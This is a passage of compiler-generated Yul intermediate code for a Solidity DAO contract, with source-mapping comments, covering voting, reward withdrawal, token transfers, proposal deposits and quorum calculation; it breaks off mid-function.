                                let expr_1586 := gt(cleanup_t_uint256(expr_1578), cleanup_t_uint256(expr_1585))
                                /// @src 0:33956:34237  "if (p.votingDeadline > proposals[blocked[msg.sender]].votingDeadline) {..."
                                if expr_1586 {
                                    /// @src 0:34215:34226  "_proposalID"
                                    let _762 := var__proposalID_1486
                                    let expr_1591 := _762
                                    /// @src 0:34193:34200  "blocked"
                                    let _763_slot := 0x13
                                    let expr_1587_slot := _763_slot
                                    /// @src 0:34201:34211  "msg.sender"
                                    let expr_1589 := caller()
                                    /// @src 0:34193:34212  "blocked[msg.sender]"
                                    let _764 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_1587_slot,expr_1589)
                                    /// @src 0:34193:34226  "blocked[msg.sender] = _proposalID"
                                    update_storage_value_offset_0_t_uint256_to_t_uint256(_764, expr_1591)
                                    let expr_1592 := expr_1591
                                    /// @src 0:33956:34237  "if (p.votingDeadline > proposals[blocked[msg.sender]].votingDeadline) {..."
                                }
                                /// @src 0:33862:34237  "if (blocked[msg.sender] == 0) {..."
                            }
                            default {
                                /// @src 0:33928:33939  "_proposalID"
                                let _765 := var__proposalID_1486
                                let expr_1573 := _765
                                /// @src 0:33906:33913  "blocked"
                                let _766_slot := 0x13
                                let expr_1569_slot := _766_slot
                                /// @src 0:33914:33924  "msg.sender"
                                let expr_1571 := caller()
                                /// @src 0:33906:33925  "blocked[msg.sender]"
                                let _767 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_1569_slot,expr_1571)
                                /// @src 0:33906:33939  "blocked[msg.sender] = _proposalID"
                                update_storage_value_offset_0_t_uint256_to_t_uint256(_767, expr_1573)
                                let expr_1574 := expr_1573
                                /// @src 0:33862:34237  "if (blocked[msg.sender] == 0) {..."
                            }
                            /// @src 0:34258:34269  "_proposalID"
                            let _768 := var__proposalID_1486
                            let expr_1598 := _768
                            /// @src 0:34271:34288  "_supportsProposal"
                            let _769 := var__supportsProposal_1488
                            let expr_1599 := _769
                            /// @src 0:34290:34300  "msg.sender"
                            let expr_1601 := caller()
                            /// @src 0:34252:34301  "Voted(_proposalID, _supportsProposal, msg.sender)"
                            let _770 := 0x86abfce99b7dd908bec0169288797f85049ec73cbe046ed9de818fab3a497ae0
                            let _771 := convert_t_uint256_to_t_uint256(expr_1598)
                            let _772 := convert_t_address_to_t_address(expr_1601)
                            {
                                let _773 := allocate_unbounded()
                                let _774 := abi_encode_tuple_t_bool__to_t_bool__fromStack(_773 , expr_1599)
                                log3(_773, sub(_774, _773) , _770, _771, _772)
                            }
                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 1605
                        /// @src 0:33322:34308  "function vote(..."
                        function fun_vote_1605(var__proposalID_1486, var__supportsProposal_1488) {

                            modifier_onlyTokenholders_1491(var__proposalID_1486, var__supportsProposal_1488)
                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2473
                        /// @src 0:41721:41837  "function getMyReward() public override returns (bool _success) {..."
                        function fun_getMyReward_2473() -> var__success_2465 {
                            /// @src 0:41769:41782  "bool _success"
                            let zero_t_bool_775 := zero_value_for_split_t_bool()
                            var__success_2465 := zero_t_bool_775

                            /// @src 0:41819:41829  "msg.sender"
                            let expr_2469 := caller()
                            /// @src 0:41801:41830  "withdrawRewardFor(msg.sender)"
                            let expr_2470 := fun_withdrawRewardFor_2534(expr_2469)
                            /// @src 0:41794:41830  "return withdrawRewardFor(msg.sender)"
                            var__success_2465 := expr_2470
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2672
                        /// @src 0:43257:43508  "function transferFromWithoutReward(..."
                        function fun_transferFromWithoutReward_2672(var__from_2646, var__to_2648, var__value_2650) -> var_success_2654 {
                            /// @src 0:43391:43403  "bool success"
                            let zero_t_bool_776 := zero_value_for_split_t_bool()
                            var_success_2654 := zero_t_bool_776

                            /// @src 0:43444:43449  "_from"
                            let _777 := var__from_2646
                            let expr_2658 := _777
                            /// @src 0:43426:43450  "withdrawRewardFor(_from)"
                            let expr_2659 := fun_withdrawRewardFor_2534(expr_2658)
                            /// @src 0:43425:43450  "!withdrawRewardFor(_from)"
                            let expr_2660 := cleanup_t_bool(iszero(expr_2659))
                            /// @src 0:43424:43451  "(!withdrawRewardFor(_from))"
                            let expr_2661 := expr_2660
                            /// @src 0:43423:43451  "!(!withdrawRewardFor(_from))"
                            let expr_2662 := cleanup_t_bool(iszero(expr_2661))
                            /// @src 0:43416:43452  "assert(!(!withdrawRewardFor(_from)))"
                            assert_helper(expr_2662)
                            /// @src 0:43482:43487  "_from"
                            let _778 := var__from_2646
                            let expr_2666 := _778
                            /// @src 0:43489:43492  "_to"
                            let _779 := var__to_2648
                            let expr_2667 := _779
                            /// @src 0:43494:43500  "_value"
                            let _780 := var__value_2650
                            let expr_2668 := _780
                            /// @src 0:43469:43501  "transferFrom(_from, _to, _value)"
                            let expr_2669 := fun_transferFrom_222(expr_2666, expr_2667, expr_2668)
                            /// @src 0:43462:43501  "return transferFrom(_from, _to, _value)"
                            var_success_2654 := expr_2669
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 268
                        /// @src 0:5112:5263  "function allowance(address _owner, address _spender) public view override returns (uint256 remaining) {..."
                        function fun_allowance_268(var__owner_253, var__spender_255) -> var_remaining_259 {
                            /// @src 0:5195:5212  "uint256 remaining"
                            let zero_t_uint256_781 := zero_value_for_split_t_uint256()
                            var_remaining_259 := zero_t_uint256_781

                            /// @src 0:5231:5238  "allowed"
                            let _782_slot := 0x06
                            let expr_261_slot := _782_slot
                            /// @src 0:5239:5245  "_owner"
                            let _783 := var__owner_253
                            let expr_262 := _783
                            /// @src 0:5231:5246  "allowed[_owner]"
                            let _784 := mapping_index_access_t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$_of_t_address(expr_261_slot,expr_262)
                            let _785_slot := _784
                            let expr_263_slot := _785_slot
                            /// @src 0:5247:5255  "_spender"
                            let _786 := var__spender_255
                            let expr_264 := _786
                            /// @src 0:5231:5256  "allowed[_owner][_spender]"
                            let _787 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_263_slot,expr_264)
                            let _788 := read_from_storage_split_offset_0_t_uint256(_787)
                            let expr_265 := _788
                            /// @src 0:5224:5256  "return allowed[_owner][_spender]"
                            var_remaining_259 := expr_265
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function cleanup_t_rational_100_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_100_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_100_by_1(value)))
                        }

                        /// @src 0:15261:15298  "uint constant maxDepositDivisor = 100"
                        function constant_maxDepositDivisor_718() -> ret {
                            /// @src 0:15295:15298  "100"
                            let expr_717 := 0x64
                            let _793 := convert_t_rational_100_by_1_to_t_uint256(expr_717)

                            ret := _793
                        }

                        /// @ast-id 2758
                        /// @src 0:43899:44171  "function changeProposalDeposit(uint _proposalDeposit) external override {..."
                        function fun_changeProposalDeposit_2758(var__proposalDeposit_2722) {

                            /// @src 0:43989:43999  "msg.sender"
                            let expr_2728 := caller()
                            /// @src 0:44011:44015  "this"
                            let expr_2731_address := address()
                            /// @src 0:44003:44016  "address(this)"
                            let expr_2732 := convert_t_contract$_DAO_$3021_to_t_address(expr_2731_address)
                            /// @src 0:43989:44016  "msg.sender != address(this)"
                            let expr_2733 := iszero(eq(cleanup_t_address(expr_2728), cleanup_t_address(expr_2732)))
                            /// @src 0:43989:44117  "msg.sender != address(this) || _proposalDeposit > (actualBalance() + rewardToken[address(this)])..."
                            let expr_2748 := expr_2733
                            if iszero(expr_2748) {
                                /// @src 0:44020:44036  "_proposalDeposit"
                                let _789 := var__proposalDeposit_2722
                                let expr_2734 := _789
                                /// @src 0:44040:44055  "actualBalance()"
                                let expr_2736 := fun_actualBalance_2833()
                                /// @src 0:44058:44069  "rewardToken"
                                let _790_slot := 0x0d
                                let expr_2737_slot := _790_slot
                                /// @src 0:44078:44082  "this"
                                let expr_2740_address := address()
                                /// @src 0:44070:44083  "address(this)"
                                let expr_2741 := convert_t_contract$_DAO_$3021_to_t_address(expr_2740_address)
                                /// @src 0:44058:44084  "rewardToken[address(this)]"
                                let _791 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2737_slot,expr_2741)
                                let _792 := read_from_storage_split_offset_0_t_uint256(_791)
                                let expr_2742 := _792
                                /// @src 0:44040:44084  "actualBalance() + rewardToken[address(this)]"
                                let expr_2743 := checked_add_t_uint256(expr_2736, expr_2742)

                                /// @src 0:44039:44085  "(actualBalance() + rewardToken[address(this)])"
                                let expr_2744 := expr_2743
                                /// @src 0:44100:44117  "maxDepositDivisor"
                                let expr_2745 := constant_maxDepositDivisor_718()
                                /// @src 0:44039:44117  "(actualBalance() + rewardToken[address(this)])..."
                                let expr_2746 := checked_div_t_uint256(expr_2744, expr_2745)

                                /// @src 0:44020:44117  "_proposalDeposit > (actualBalance() + rewardToken[address(this)])..."
                                let expr_2747 := gt(cleanup_t_uint256(expr_2734), cleanup_t_uint256(expr_2746))
                                /// @src 0:43989:44117  "msg.sender != address(this) || _proposalDeposit > (actualBalance() + rewardToken[address(this)])..."
                                expr_2748 := expr_2747
                            }
                            /// @src 0:43988:44118  "(msg.sender != address(this) || _proposalDeposit > (actualBalance() + rewardToken[address(this)])..."
                            let expr_2749 := expr_2748
                            /// @src 0:43987:44118  "!(msg.sender != address(this) || _proposalDeposit > (actualBalance() + rewardToken[address(this)])..."
                            let expr_2750 := cleanup_t_bool(iszero(expr_2749))
                            /// @src 0:43980:44119  "assert(!(msg.sender != address(this) || _proposalDeposit > (actualBalance() + rewardToken[address(this)])..."
                            assert_helper(expr_2750)
                            /// @src 0:44148:44164  "_proposalDeposit"
                            let _794 := var__proposalDeposit_2722
                            let expr_2754 := _794
                            /// @src 0:44130:44164  "proposalDeposit = _proposalDeposit"
                            update_storage_value_offset_0_t_uint256_to_t_uint256(0x14, expr_2754)
                            let expr_2755 := expr_2754

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2644
                        /// @src 0:42858:43250  "function transferFrom_2(address _from, address _to, uint256 _value) public returns (bool success) {..."
                        function fun_transferFrom_2_2644(var__from_2601, var__to_2603, var__value_2605) -> var_success_2608 {
                            /// @src 0:42942:42954  "bool success"
                            let zero_t_bool_795 := zero_value_for_split_t_bool()
                            var_success_2608 := zero_t_bool_795

                            /// @src 0:42970:42978  "isFueled"
                            let _796 := read_from_storage_split_offset_0_t_bool(0x02)
                            let expr_2610 := _796
                            /// @src 0:42970:43023  "isFueled..."
                            let expr_2615 := expr_2610
                            if expr_2615 {
                                /// @src 0:42994:43009  "block.timestamp"
                                let expr_2612 := timestamp()
                                /// @src 0:43012:43023  "closingTime"
                                let _797 := read_from_storage_split_offset_0_t_uint256(0x00)
                                let expr_2613 := _797
                                /// @src 0:42994:43023  "block.timestamp > closingTime"
                                let expr_2614 := gt(cleanup_t_uint256(expr_2612), cleanup_t_uint256(expr_2613))
                                /// @src 0:42970:43023  "isFueled..."
                                expr_2615 := expr_2614
                            }
                            /// @src 0:42970:43056  "isFueled..."
                            let expr_2620 := expr_2615
                            if expr_2620 {
                                /// @src 0:43050:43055  "_from"
                                let _798 := var__from_2601
                                let expr_2617 := _798
                                /// @src 0:43040:43056  "isBlocked(_from)"
                                let expr_2618 := fun_isBlocked_3008(expr_2617)
                                /// @src 0:43039:43056  "!isBlocked(_from)"
                                let expr_2619 := cleanup_t_bool(iszero(expr_2618))
                                /// @src 0:42970:43056  "isFueled..."
                                expr_2620 := expr_2619
                            }
                            /// @src 0:42970:43107  "isFueled..."
                            let expr_2626 := expr_2620
                            if expr_2626 {
                                /// @src 0:43088:43093  "_from"
                                let _799 := var__from_2601
                                let expr_2622 := _799
                                /// @src 0:43095:43098  "_to"
                                let _800 := var__to_2603
                                let expr_2623 := _800
                                /// @src 0:43100:43106  "_value"
                                let _801 := var__value_2605
                                let expr_2624 := _801
                                /// @src 0:43072:43107  "transferPaidOut(_from, _to, _value)"
                                let expr_2625 := fun_transferPaidOut_2720(expr_2622, expr_2623, expr_2624)
                                /// @src 0:42970:43107  "isFueled..."
                                expr_2626 := expr_2625
                            }
                            /// @src 0:42970:43161  "isFueled..."
                            let expr_2633 := expr_2626
                            if expr_2633 {
                                /// @src 0:43142:43147  "_from"
                                let _802 := var__from_2601
                                let expr_2629 := _802
                                /// @src 0:43149:43152  "_to"
                                let _803 := var__to_2603
                                let expr_2630 := _803
                                /// @src 0:43154:43160  "_value"
                                let _804 := var__value_2605
                                let expr_2631 := _804
                                /// @src 0:43123:43161  "super.transferFrom(_from, _to, _value)"
                                let expr_2632 := fun_transferFrom_222(expr_2629, expr_2630, expr_2631)
                                /// @src 0:42970:43161  "isFueled..."
                                expr_2633 := expr_2632
                            }
                            /// @src 0:42966:43244  "if (isFueled..."
                            switch expr_2633
                            case 0 {
                                /// @src 0:43227:43232  "false"
                                let expr_2638 := 0x00
                                /// @src 0:43220:43233  "assert(false)"
                                assert_helper(expr_2638)
                                /// @src 0:42966:43244  "if (isFueled..."
                            }
                            default {
                                /// @src 0:43185:43189  "true"
                                let expr_2634 := 0x01
                                /// @src 0:43178:43189  "return true"
                                var_success_2608 := expr_2634
                                leave
                                /// @src 0:42966:43244  "if (isFueled..."
                            }

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 1484
                        /// @src 0:32955:33315  "function checkProposalCode(..."
                        function fun_checkProposalCode_1484(var__proposalID_1452, var__recipient_1454, var__amount_1456, var__transactionData_1458_mpos) -> var__codeChecksOut_1462 {
                            /// @src 0:33133:33152  "bool _codeChecksOut"
                            let zero_t_bool_805 := zero_value_for_split_t_bool()
                            var__codeChecksOut_1462 := zero_t_bool_805

                            /// @src 0:33185:33194  "proposals"
                            let _806_slot := 0x08
                            let expr_1467_slot := _806_slot
                            /// @src 0:33195:33206  "_proposalID"
                            let _807 := var__proposalID_1452
                            let expr_1468 := _807
                            /// @src 0:33185:33207  "proposals[_proposalID]"

                            let _808, _809 := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(expr_1467_slot, expr_1468)
                            let _810_slot := _808
                            let expr_1469_slot := _810_slot
                            /// @src 0:33164:33207  "Proposal storage p = proposals[_proposalID]"
                            let var_p_1466_slot := convert_t_struct$_Proposal_$800_storage_to_t_struct$_Proposal_$800_storage_ptr(expr_1469_slot)
                            /// @src 0:33224:33225  "p"
                            let _811_slot := var_p_1466_slot
                            let expr_1471_slot := _811_slot
                            /// @src 0:33224:33238  "p.proposalHash"
                            let _812 := add(expr_1471_slot, 5)
                            let _813 := read_from_storage_split_offset_0_t_bytes32(_812)
                            let expr_1472 := _813
                            /// @src 0:33269:33279  "_recipient"
                            let _814 := var__recipient_1454
                            let expr_1476 := _814
                            /// @src 0:33281:33288  "_amount"
                            let _815 := var__amount_1456
                            let expr_1477 := _815
                            /// @src 0:33290:33306  "_transactionData"
                            let _816_mpos := var__transactionData_1458_mpos
                            let expr_1478_mpos := _816_mpos
                            /// @src 0:33252:33307  "abi.encodePacked(_recipient, _amount, _transactionData)"

                            let expr_1479_mpos := allocate_unbounded()
                            let _817 := add(expr_1479_mpos, 0x20)

                            let _818 := abi_encode_tuple_packed_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_uint256_t_bytes_memory_ptr__nonPadded_inplace_fromStack(_817, expr_1476, expr_1477, expr_1478_mpos)
                            mstore(expr_1479_mpos, sub(_818, add(expr_1479_mpos, 0x20)))
                            finalize_allocation(expr_1479_mpos, sub(_818, expr_1479_mpos))
                            /// @src 0:33242:33308  "keccak256(abi.encodePacked(_recipient, _amount, _transactionData))"
                            let expr_1480 := keccak256(array_dataslot_t_bytes_memory_ptr(expr_1479_mpos), array_length_t_bytes_memory_ptr(expr_1479_mpos))
                            /// @src 0:33224:33308  "p.proposalHash == keccak256(abi.encodePacked(_recipient, _amount, _transactionData))"
                            let expr_1481 := eq(cleanup_t_bytes32(expr_1472), cleanup_t_bytes32(expr_1480))
                            /// @src 0:33217:33308  "return p.proposalHash == keccak256(abi.encodePacked(_recipient, _amount, _transactionData))"
                            var__codeChecksOut_1462 := expr_1481
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function cleanup_t_rational_3456000_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_3456000_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_3456000_by_1(value)))
                        }

                        /// @src 0:14437:14480  "uint constant creationGracePeriod = 40 days"
                        function constant_creationGracePeriod_700() -> ret {
                            /// @src 0:14473:14480  "40 days"
                            let expr_699 := 0x34bc00
                            let _821 := convert_t_rational_3456000_by_1_to_t_uint256(expr_699)

                            ret := _821
                        }

                        /// @ast-id 1210
                        /// @src 0:30596:30894  "fallback(bytes calldata) external override returns (bytes memory) {..."
                        function fun__1210(var__1174_offset, var__1174_length) -> var__1178_mpos {
                            /// @src 0:30648:30660  "bytes memory"
                            let zero_t_bytes_memory_ptr_819_mpos := zero_value_for_split_t_bytes_memory_ptr()

                            var__1178_mpos := zero_t_bytes_memory_ptr_819_mpos


                            /// @src 0:30676:30691  "block.timestamp"
                            let expr_1181 := timestamp()


                            /// @src 0:30694:30705  "closingTime"
                            let _820 := read_from_storage_split_offset_0_t_uint256(0x00)
                            let expr_1182 := _820
                            /// @src 0:30708:30727  "creationGracePeriod"
                            let expr_1183 := constant_creationGracePeriod_700()
                            /// @src 0:30694:30727  "closingTime + creationGracePeriod"
                            let expr_1184 := checked_add_t_uint256(expr_1182, expr_1183)


                            /// @src 0:30676:30727  "block.timestamp < closingTime + creationGracePeriod"
                            let expr_1185 := lt(cleanup_t_uint256(expr_1181), cleanup_t_uint256(expr_1184))
                            /// @src 0:30676:30766  "block.timestamp < closingTime + creationGracePeriod && msg.sender != address(extraBalance)"
                            let expr_1193 := expr_1185
                            if expr_1193 {
                                /// @src 0:30731:30741  "msg.sender"
                                let expr_1187 := caller()
                                /// @src 0:30753:30765  "extraBalance"
                                let _822_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x03)
                                let expr_1190_address := _822_address
                                /// @src 0:30745:30766  "address(extraBalance)"
                                let expr_1191 := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_1190_address)
                                /// @src 0:30731:30766  "msg.sender != address(extraBalance)"
                                let expr_1192 := iszero(eq(cleanup_t_address(expr_1187), cleanup_t_address(expr_1191)))
                                /// @src 0:30676:30766  "block.timestamp < closingTime + creationGracePeriod && msg.sender != address(extraBalance)"
                                expr_1193 := expr_1192
                            }


                            /// @src 0:30672:30887  "if (block.timestamp < closingTime + creationGracePeriod && msg.sender != address(extraBalance))..."
                            switch expr_1193
                            case 0 {

                                /// @src 0:30872:30886  "receiveEther()"
                                let expr_1205 := fun_receiveEther_1219()
                                /// @src 0:30861:30887  "abi.encode(receiveEther())"

                                let expr_1206_mpos := allocate_unbounded()
                                let _823 := add(expr_1206_mpos, 0x20)

                                let _824 := abi_encode_tuple_t_bool__to_t_bool__fromStack(_823, expr_1205)
                                mstore(expr_1206_mpos, sub(_824, add(expr_1206_mpos, 0x20)))
                                finalize_allocation(expr_1206_mpos, sub(_824, expr_1206_mpos))
                                /// @src 0:30854:30887  "return abi.encode(receiveEther())"
                                var__1178_mpos := expr_1206_mpos
                                leave
                                /// @src 0:30672:30887  "if (block.timestamp < closingTime + creationGracePeriod && msg.sender != address(extraBalance))..."
                            }
                            default {

                                /// @src 0:30815:30825  "msg.sender"
                                let expr_1198 := caller()


                                /// @src 0:30798:30826  "createTokenProxy(msg.sender)"
                                let expr_1199 := fun_createTokenProxy_569(expr_1198)
                                /// @src 0:30787:30827  "abi.encode(createTokenProxy(msg.sender))"


                                let expr_1200_mpos := allocate_unbounded()
                                let _825 := add(expr_1200_mpos, 0x20)

                                let _826 := abi_encode_tuple_t_bool__to_t_bool__fromStack(_825, expr_1199)
                                mstore(expr_1200_mpos, sub(_826, add(expr_1200_mpos, 0x20)))
                                finalize_allocation(expr_1200_mpos, sub(_826, expr_1200_mpos))

                                
                                /// @src 0:30780:30827  "return abi.encode(createTokenProxy(msg.sender))"
                                var__1178_mpos := expr_1200_mpos
                                leave
                                /// @src 0:30672:30887  "if (block.timestamp < closingTime + creationGracePeriod && msg.sender != address(extraBalance))..."
                            }

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 1938
                        /// @src 0:37397:37607  "function closeProposal(uint _proposalID) internal {..."
                        function fun_closeProposal_1938(var__proposalID_1913) {

                            /// @src 0:37478:37487  "proposals"
                            let _827_slot := 0x08
                            let expr_1919_slot := _827_slot
                            /// @src 0:37488:37499  "_proposalID"
                            let _828 := var__proposalID_1913
                            let expr_1920 := _828
                            /// @src 0:37478:37500  "proposals[_proposalID]"

                            let _829, _830 := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(expr_1919_slot, expr_1920)
                            let _831_slot := _829
                            let expr_1921_slot := _831_slot
                            /// @src 0:37457:37500  "Proposal storage p = proposals[_proposalID]"
                            let var_p_1918_slot := convert_t_struct$_Proposal_$800_storage_to_t_struct$_Proposal_$800_storage_ptr(expr_1921_slot)
                            /// @src 0:37514:37515  "p"
                            let _832_slot := var_p_1918_slot
                            let expr_1923_slot := _832_slot
                            /// @src 0:37514:37520  "p.open"
                            let _833 := add(expr_1923_slot, 4)
                            let _834 := read_from_storage_split_offset_0_t_bool(_833)
                            let expr_1924 := _834
                            /// @src 0:37510:37576  "if (p.open)..."
                            if expr_1924 {
                                /// @src 0:37559:37560  "p"
                                let _835_slot := var_p_1918_slot
                                let expr_1926_slot := _835_slot
                                /// @src 0:37559:37576  "p.proposalDeposit"
                                let _836 := add(expr_1926_slot, 6)
                                let _837 := read_from_storage_split_offset_0_t_uint256(_836)
                                let expr_1927 := _837
                                /// @src 0:37534:37576  "sumOfProposalDeposits -= p.proposalDeposit"
                                let _838 := read_from_storage_split_offset_0_t_uint256(0x15)
                                let expr_1928 := checked_sub_t_uint256(_838, expr_1927)

                                update_storage_value_offset_0_t_uint256_to_t_uint256(0x15, expr_1928)
                                /// @src 0:37510:37576  "if (p.open)..."
                            }
                            /// @src 0:37595:37600  "false"
                            let expr_1934 := 0x00
                            /// @src 0:37586:37587  "p"
                            let _839_slot := var_p_1918_slot
                            let expr_1931_slot := _839_slot
                            /// @src 0:37586:37592  "p.open"
                            let _840 := add(expr_1931_slot, 4)
                            /// @src 0:37586:37600  "p.open = false"
                            update_storage_value_offset_0_t_bool_to_t_bool(_840, expr_1934)
                            let expr_1935 := expr_1934

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2819
                        /// @src 0:44472:44934  "function isRecipientAllowed(address _recipient) view internal returns (bool _isAllowed) {..."
                        function fun_isRecipientAllowed_2819(var__recipient_2791) -> var__isAllowed_2794 {
                            /// @src 0:44543:44558  "bool _isAllowed"
                            let zero_t_bool_841 := zero_value_for_split_t_bool()
                            var__isAllowed_2794 := zero_t_bool_841

                            /// @src 0:44574:44591  "allowedRecipients"
                            let _842_slot := 0x0c
                            let expr_2796_slot := _842_slot
                            /// @src 0:44592:44602  "_recipient"
                            let _843 := var__recipient_2791
                            let expr_2797 := _843
                            /// @src 0:44574:44603  "allowedRecipients[_recipient]"
                            let _844 := mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(expr_2796_slot,expr_2797)
                            let _845 := read_from_storage_split_offset_0_t_bool(_844)
                            let expr_2798 := _845
                            /// @src 0:44574:44863  "allowedRecipients[_recipient]..."
                            let expr_2812 := expr_2798
                            if iszero(expr_2812) {
                                /// @src 0:44620:44630  "_recipient"
                                let _846 := var__recipient_2791
                                let expr_2799 := _846
                                /// @src 0:44642:44654  "extraBalance"
                                let _847_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x03)
                                let expr_2802_address := _847_address
                                /// @src 0:44634:44655  "address(extraBalance)"
                                let expr_2803 := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_2802_address)
                                /// @src 0:44620:44655  "_recipient == address(extraBalance)"
                                let expr_2804 := eq(cleanup_t_address(expr_2799), cleanup_t_address(expr_2803))
                                /// @src 0:44620:44862  "_recipient == address(extraBalance)..."
                                let expr_2810 := expr_2804
                                if expr_2810 {
                                    /// @src 0:44812:44828  "totalRewardToken"
                                    let _848 := read_from_storage_split_offset_0_t_uint256(0x0e)
                                    let expr_2805 := _848
                                    /// @src 0:44831:44843  "extraBalance"
                                    let _849_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x03)
                                    let expr_2806_address := _849_address
                                    /// @src 0:44831:44860  "extraBalance.accumulatedInput"
                                    let expr_2807_address := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_2806_address)
                                    let expr_2807_functionSelector := 0xd2cc718f
                                    /// @src 0:44831:44862  "extraBalance.accumulatedInput()"

                                    // storage for arguments and returned data
                                    let _850 := allocate_unbounded()
                                    mstore(_850, shift_left_224(expr_2807_functionSelector))
                                    let _851 := abi_encode_tuple__to__fromStack(add(_850, 4) )


                                    let _852 := staticcall(gas(), expr_2807_address,  _850, sub(_851, _850), _850, 32)

                                    if iszero(_852) { revert_forward_1() }

                                    let expr_2808
                                    if _852 {

                                        let _853 := 32

                                        if gt(_853, returndatasize()) {
                                            _853 := returndatasize()
                                        }

                                        // update freeMemoryPointer according to dynamic return size
                                        finalize_allocation(_850, _853)

                                        // decode return parameters from external try-call into retVars
                                        expr_2808 :=  abi_decode_tuple_t_uint256_fromMemory(_850, add(_850, _853))
                                    }
                                    /// @src 0:44812:44862  "totalRewardToken > extraBalance.accumulatedInput()"
                                    let expr_2809 := gt(cleanup_t_uint256(expr_2805), cleanup_t_uint256(expr_2808))
                                    /// @src 0:44620:44862  "_recipient == address(extraBalance)..."
                                    expr_2810 := expr_2809
                                }
                                /// @src 0:44619:44863  "(_recipient == address(extraBalance)..."
                                let expr_2811 := expr_2810
                                /// @src 0:44574:44863  "allowedRecipients[_recipient]..."
                                expr_2812 := expr_2811
                            }
                            /// @src 0:44570:44927  "if (allowedRecipients[_recipient]..."
                            switch expr_2812
                            case 0 {
                                /// @src 0:44922:44927  "false"
                                let expr_2815 := 0x00
                                /// @src 0:44915:44927  "return false"
                                var__isAllowed_2794 := expr_2815
                                leave
                                /// @src 0:44570:44927  "if (allowedRecipients[_recipient]..."
                            }
                            default {
                                /// @src 0:44884:44888  "true"
                                let expr_2813 := 0x01
                                /// @src 0:44877:44888  "return true"
                                var__isAllowed_2794 := expr_2813
                                leave
                                /// @src 0:44570:44927  "if (allowedRecipients[_recipient]..."
                            }

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2864
                        /// @src 0:45083:45349  "function minQuorum(uint _value) internal view returns (uint _minQuorum) {..."
                        function fun_minQuorum_2864(var__value_2835) -> var__minQuorum_2838 {
                            /// @src 0:45138:45153  "uint _minQuorum"
                            let zero_t_uint256_854 := zero_value_for_split_t_uint256()
                            var__minQuorum_2838 := zero_t_uint256_854

                            /// @src 0:45220:45231  "totalSupply"
                            let _855 := read_from_storage_split_offset_0_t_uint256(0x07)
                            let expr_2840 := _855
                            /// @src 0:45234:45250  "minQuorumDivisor"
                            let _856 := read_from_storage_split_offset_0_t_uint256(0x09)
                            let expr_2841 := _856
                            /// @src 0:45220:45250  "totalSupply / minQuorumDivisor"
                            let expr_2842 := checked_div_t_uint256(expr_2840, expr_2841)

                            /// @src 0:45266:45272  "_value"
                            let _857 := var__value_2835
                            let expr_2843 := _857
                            /// @src 0:45275:45286  "totalSupply"
                            let _858 := read_from_storage_split_offset_0_t_uint256(0x07)
                            let expr_2844 := _858
                            /// @src 0:45266:45286  "_value * totalSupply"
                            let expr_2845 := checked_mul_t_uint256(expr_2843, expr_2844)

                            /// @src 0:45265:45287  "(_value * totalSupply)"
                            let expr_2846 := expr_2845
                            /// @src 0:45291:45292  "3"
                            let expr_2847 := 0x03
                            /// @src 0:45296:45311  "actualBalance()"
                            let expr_2849 := fun_actualBalance_2833()
                            /// @src 0:45314:45325  "rewardToken"
                            let _859_slot := 0x0d
                            let expr_2850_slot := _859_slot
                            /// @src 0:45334:45338  "this"
                            let expr_2853_address := address()
                            /// @src 0:45326:45339  "address(this)"
                            let expr_2854 := convert_t_contract$_DAO_$3021_to_t_address(expr_2853_address)
                            /// @src 0:45314:45340  "rewardToken[address(this)]"
                            let _860 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2850_slot,expr_2854)
                            let _861 := read_from_storage_split_offset_0_t_uint256(_860)
                            let expr_2855 := _861
                            /// @src 0:45296:45340  "actualBalance() + rewardToken[address(this)]"
                            let expr_2856 := checked_add_t_uint256(expr_2849, expr_2855)

                            /// @src 0:45295:45341  "(actualBalance() + rewardToken[address(this)])"
                            let expr_2857 := expr_2856
                            /// @src 0:45291:45341  "3 * (actualBalance() + rewardToken[address(this)])"
                            let expr_2858 := checked_mul_t_uint256(convert_t_rational_3_by_1_to_t_uint256(expr_2847), expr_2857)

                            /// @src 0:45290:45342  "(3 * (actualBalance() + rewardToken[address(this)]))"
                            let expr_2859 := expr_2858
